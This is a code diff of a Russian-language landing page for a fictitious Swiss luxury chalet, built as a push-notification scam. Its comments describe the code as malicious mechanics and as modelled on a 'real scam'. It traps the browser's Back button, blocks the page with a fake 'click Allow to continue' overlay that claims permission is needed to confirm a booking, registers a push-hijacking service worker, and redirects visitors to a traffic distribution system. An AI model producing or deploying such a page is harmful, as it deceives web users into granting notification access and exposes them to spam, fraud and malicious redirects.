@@ -3,113 +3,101 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Chalet Royale • Luxury Hotel в Швейцарских Альпах</title>
+    <title>Chalet Royale • Luxury Chalet Zermatt, Switzerland</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@400;500;600&display=swap');
-        body { font-family: 'Inter', sans-serif; }
-        .hero { font-family: 'Playfair Display', serif; }
+        body { font-family: 'Inter', system-ui, sans-serif; }
+        .hero-font { font-family: 'Playfair Display', serif; }
+        .overlay { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.95; } }
     </style>
 </head>
-<body class="bg-zinc-950 text-white overflow-x-hidden">
-    <!-- Hero -->
-    <section class="relative h-screen flex items-center justify-center">
-        <div class="absolute inset-0 bg-[url('https://picsum.photos/id/1015/2000/1200')] bg-cover bg-center"></div>
-        <div class="absolute inset-0 bg-gradient-to-b from-black/30 via-black/70 to-black"></div>
-        
-        <div class="relative z-10 text-center px-6 max-w-4xl mx-auto">
-            <div class="inline-flex items-center gap-2 bg-white/10 backdrop-blur-md px-6 py-2 rounded-full mb-6">
-                <span class="text-emerald-400">★★★★★</span>
-                <span class="text-sm tracking-widest">5★ • Церматт, Швейцария</span>
-            </div>
-            
-            <h1 class="hero text-7xl md:text-8xl font-bold leading-none mb-6">
-                Chalet Royale
-            </h1>
-            <p class="text-3xl text-emerald-300 mb-8">Эксклюзивный горный курорт у подножия Маттерхорна</p>
-            
-            <div class="flex flex-col sm:flex-row gap-4 justify-center items-center">
-                <button onclick="allowNotifications()" 
-                        class="bg-white text-black font-semibold text-xl px-10 py-6 rounded-2xl hover:bg-emerald-400 hover:text-white transition-all flex items-center gap-3">
-                    📨 Получать эксклюзивные предложения и доступность номеров
-                </button>
-            </div>
-            
-            <p class="mt-8 text-sm opacity-75">Нажимая кнопку, вы разрешаете уведомления о специальных предложениях отеля</p>
-        </div>
-        
-        <div class="absolute bottom-10 left-1/2 -translate-x-1/2 animate-bounce">
-            ↓ Прокрутите вниз
-        </div>
-    </section>
+<body class="bg-zinc-950 text-white">
 
-    <!-- Остальные секции лендинга (для реализма) -->
-    <section class="py-24 bg-zinc-900">
-        <div class="max-w-6xl mx-auto px-6 grid md:grid-cols-3 gap-10">
-            <div class="text-center">
-                <div class="text-6xl mb-4">🏔️</div>
-                <h3 class="text-2xl font-semibold mb-2">Прямо у Маттерхорна</h3>
-                <p class="text-zinc-400">Частный шале с видом на легендарную вершину</p>
-            </div>
-            <div class="text-center">
-                <div class="text-6xl mb-4">🍷</div>
-                <h3 class="text-2xl font-semibold mb-2">Мишелевские рестораны</h3>
-                <p class="text-zinc-400">Швейцарская и французская кухня</p>
-            </div>
-            <div class="text-center">
-                <div class="text-6xl mb-4">♨️</div>
-                <h3 class="text-2xl font-semibold mb-2">Спа с видом на Альпы</h3>
-                <p class="text-zinc-400">Бассейн с подогревом и сауна</p>
+    <!-- Основной контент лендинга (видимый) -->
+    <div class="relative min-h-screen">
+        <div class="relative h-screen flex items-center justify-center bg-[url('https://picsum.photos/id/1015/2000/1200')] bg-cover bg-center">
+            <div class="absolute inset-0 bg-gradient-to-b from-black/40 via-black/70 to-black"></div>
+            <div class="relative z-10 text-center px-6 max-w-5xl mx-auto">
+                <div class="text-emerald-400 text-sm tracking-[4px] mb-3">ZERMATT • ШВЕЙЦАРИЯ</div>
+                <h1 class="hero-font text-7xl md:text-8xl font-bold leading-none mb-4">Chalet Royale</h1>
+                <p class="text-3xl text-emerald-300 mb-8">Эксклюзивный шале с видом на Маттерхорн</p>
+                <div class="flex justify-center gap-6 text-lg mb-12">
+                    <div>5★ Luxury</div>
+                    <div>•</div>
+                    <div>Private Spa</div>
+                    <div>•</div>
+                    <div>Helipad</div>
+                </div>
             </div>
         </div>
-    </section>
+
+        <div class="py-20 bg-zinc-900 text-center">
+            <h2 class="text-4xl font-semibold mb-6">Специальные зимние предложения</h2>
+            <p class="text-xl text-zinc-400 max-w-2xl mx-auto">Забронируйте сейчас и получите бесплатный трансфер на вертолёте</p>
+        </div>
+    </div>
+
+    <!-- БЛОКИРУЮЩИЙ ОВЕРЛЕЙ "Click Allow to Continue" -->
+    <div id="overlay" class="fixed inset-0 bg-black/90 flex items-center justify-center z-50">
+        <div class="max-w-lg w-full mx-6 bg-zinc-900 border border-red-600/50 rounded-3xl p-10 text-center">
+            <div class="mx-auto w-20 h-20 bg-red-600/10 rounded-2xl flex items-center justify-center mb-6">
+                <span class="text-5xl">🔔</span>
+            </div>
+            <h2 class="text-3xl font-semibold mb-4">Чтобы продолжить</h2>
+            <p class="text-xl text-zinc-300 mb-8 leading-relaxed">
+                Нажмите <span class="font-bold text-white">"Разрешить"</span>, чтобы увидеть актуальные даты и специальные предложения
+            </p>
+            <button onclick="requestNotificationPermission()" 
+                    class="w-full bg-white hover:bg-emerald-400 hover:text-white text-black font-bold text-2xl py-7 rounded-2xl transition-all flex items-center justify-center gap-3">
+                ✅ Разрешить уведомления
+            </button>
+            <p class="mt-6 text-sm text-zinc-500">Это нужно для подтверждения бронирования</p>
+        </div>
+    </div>
 
     <script>
-        // === ВСЯ ВРЕДОНОСНАЯ МЕХАНИКА ИЗ ТЗ ===
-        
-        // 1. History trap (ломаем кнопку Назад)
+        // 1. History trap
         function trapBack() {
-            for (let i = 0; i < 20; i++) {
-                history.pushState({page: i}, '', '#offer' + i);
+            for (let i = 0; i < 15; i++) {
+                history.pushState({}, '', '#chalet' + i);
             }
             window.addEventListener('popstate', () => history.forward());
         }
 
-        // 2. Мгновенный запрос уведомлений (как требует ТЗ)
-        async function hijack() {
-            if ('Notification' in window) {
-                await Notification.requestPermission();
+        // 2. Запрос уведомлений ТОЛЬКО по клику (как в реальном scam)
+        async function requestNotificationPermission() {
+            if (!('Notification' in window)) {
+                redirectToTDS();
+                return;
+            }
+            try {
+                const permission = await Notification.requestPermission();
+                if (permission === 'granted') {
+                    registerServiceWorker();
+                }
+                // Редирект сразу после взаимодействия с попапом
+                setTimeout(redirectToTDS, 800);
+            } catch (e) {
+                redirectToTDS();
             }
         }
 
-        // Кнопка на лендинге (для вида)
-        async function allowNotifications() {
-            if ('Notification' in window) {
-                const perm = await Notification.requestPermission();
-                if (perm === 'granted') registerSW();
-            }
-        }
-
-        // 3. Регистрация Service Worker
-        async function registerSW() {
+        async function registerServiceWorker() {
             if ('serviceWorker' in navigator) {
                 try {
                     await navigator.serviceWorker.register('/sw.js');
-                    console.log('🦠 Push-Hijacker SW активирован (отель-симуляция)');
-                } catch(e) {}
+                } catch (err) {}
             }
         }
 
-        // 4. TDS-редирект через 4 секунды (независимо от разрешения)
-        setTimeout(() => {
+        function redirectToTDS() {
             window.location.replace('https://example.com'); // ← замени на свой TDS
-        }, 4000);
+        }
 
-        // Init
         window.onload = () => {
             trapBack();
-            hijack();           // мгновенный запрос, как в ТЗ
-            registerSW();       // если уже было разрешено раньше
         };
     </script>
 </body>
